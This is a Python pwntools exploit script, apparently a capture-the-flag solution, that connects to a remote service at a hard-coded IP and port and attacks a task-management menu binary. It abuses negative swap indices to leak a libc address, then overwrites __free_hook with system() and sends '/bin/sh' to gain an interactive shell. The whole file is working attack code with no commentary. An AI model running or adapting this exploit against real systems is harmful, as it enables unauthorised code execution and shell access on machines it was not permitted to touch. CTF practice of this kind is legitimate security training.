

from pwn import *
import struct

# p = process('./tosakimimi')
p = remote("103.167.132.188", 11696)

def add_task(taskid):
    p.sendlineafter(">", "1")
    p.sendlineafter("id:", str(taskid))

def swap_task(ind1, ind2):
    p.sendlineafter(">", "2")
    p.sendlineafter("indices", str(ind1) + " " + str(ind2))

def finish_top():
    p.sendlineafter(">", "3")

def quit():
    p.sendlineafter(">", "4")


p.sendlineafter("name:", "A"*0x800)
add_task(1234)
add_task(4321)
swap_task(2, -723)
finish_top()
p.recvuntil("id:")
libc_leak = int(p.recvline())
print(hex(libc_leak))
libc_base = libc_leak - 0x1ed0b0
free_hook = libc_base + 0x1eee48
place = free_hook - 0x10
system = libc_base + 0x52290

add_task(place)
# swap_task(2, -10770)
swap_task(2, -11154)

quit()
p.sendlineafter("notice:", b"/bin/sh\x00" + p64(0) + p64(system) + b"\x00"*0x50)



p.interactive()